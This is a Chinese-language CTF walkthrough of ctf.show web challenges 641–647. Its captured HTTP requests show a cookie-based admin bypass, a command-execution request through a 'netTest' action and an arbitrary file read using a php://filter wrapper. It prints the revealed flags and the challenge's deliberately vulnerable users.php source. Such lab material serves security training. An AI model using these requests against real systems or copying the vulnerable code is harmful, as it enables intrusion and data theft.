<p>试着进入<code>/system36d</code>发现是个登录界面，</p>
<p>在<code>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/static/js/lock/index.js</code>查看源代码,拿到644的flag同时找到了这个</p>
<p><code>checklogin.php?s=10</code>,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/checklogin.php?s=10</span><br></pre></td></tr></table></figure>

<p>然后进入了后台</p>
<h1 id="web642"><a href="#web642" class="headerlink" title="web642"></a>web642</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/ HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>这样子拿到了642的flag，不是哥们我到处找啊这东西有意思</p>
<h1 id="web641"><a href="#web641" class="headerlink" title="web641"></a>web641</h1><p>既然刚才抓包得到了642，那么回去找找641的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h1 id="web643"><a href="#web643" class="headerlink" title="web643"></a>web643</h1><p>发现那个网页可以执行命令那么试试，只有三个命令，而且ping还不可以使用，继续看抓包能不能强行修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=netTest&amp;cmd=ls HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到<code>secret.txt</code>，访问之后拿去解码就是web643的flag</p>
<h1 id="web645"><a href="#web645" class="headerlink" title="web645"></a>web645</h1><p>数据备份里面有<code>645flag</code></p>
<h1 id="web646"><a href="#web646" class="headerlink" title="web646"></a>web646</h1><p>在远程更新里面，进行任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dinit.php HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PATH&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&#x27;/db/data_you_never_know.db&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG645&#x27;</span>,<span class="string">&#x27;flag645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG646&#x27;</span>,<span class="string">&#x27;flag646=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//存在漏洞，未修补前注释掉</span></span><br><span class="line"><span class="comment">//include &#x27;util/common.php&#x27;;</span></span><br></pre></td></tr></table></figure>

<h1 id="web647"><a href="#web647" class="headerlink" title="web647"></a>web647</h1><p>那么我们读取文件一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- checklogin.php</span><br><span class="line">- db</span><br><span class="line">- index.php</span><br><span class="line">- init.php</span><br><span class="line">- login.php</span><br><span class="line">- logout.php</span><br><span class="line">- main.php</span><br><span class="line">- secret.txt</span><br><span class="line">- static</span><br><span class="line">- update.php</span><br><span class="line">- update2.php</span><br><span class="line">- users.php</span><br><span class="line">- util</span><br></pre></td></tr></table></figure>

<p>users.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-26 10:25:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-08-01 01:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(DB_PATH);</span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">getUsers</span>(<span class="variable">$data</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">addUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">delUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">updateUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;backup&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">backupUsers</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">recoveryUsers</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;phpInfo&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">phpInfoTest</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;netTest&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">netTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;remoteUpdate&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">remoteUpdate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;update_address&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;authKeyValidate&#x27;</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">authKeyValidate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;evilString&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">evilString</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;evilNumber&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">evilNumber</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;evilFunction&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">evilFunction</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;evilArray&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">evilArray</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;evilClass&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">evilClass</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">		));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$page</span>=<span class="number">1</span>,<span class="variable">$limit</span>=<span class="number">10</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取成功&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$isadmin</span> = <span class="string">&#x27;否&#x27;</span>;</span><br><span class="line">	<span class="variable">$pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span>=<span class="string">&#x27;无&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">	<span class="title function_ invoke__">array_pop</span>(<span class="variable">$users</span>);</span><br><span class="line">	<span class="variable">$index</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$u</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$isadmin</span> = <span class="string">&#x27;是&#x27;</span>;</span><br><span class="line">			<span class="variable">$pass</span> = <span class="string">&#x27;flag就是管理员的密码，不过我隐藏了&#x27;</span>;</span><br><span class="line">			<span class="variable">$content</span> = <span class="string">&#x27;删除此条记录后flag就会消失&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$pass</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$index</span>,</span><br><span class="line">			<span class="string">&#x27;username&#x27;</span>=&gt;<span 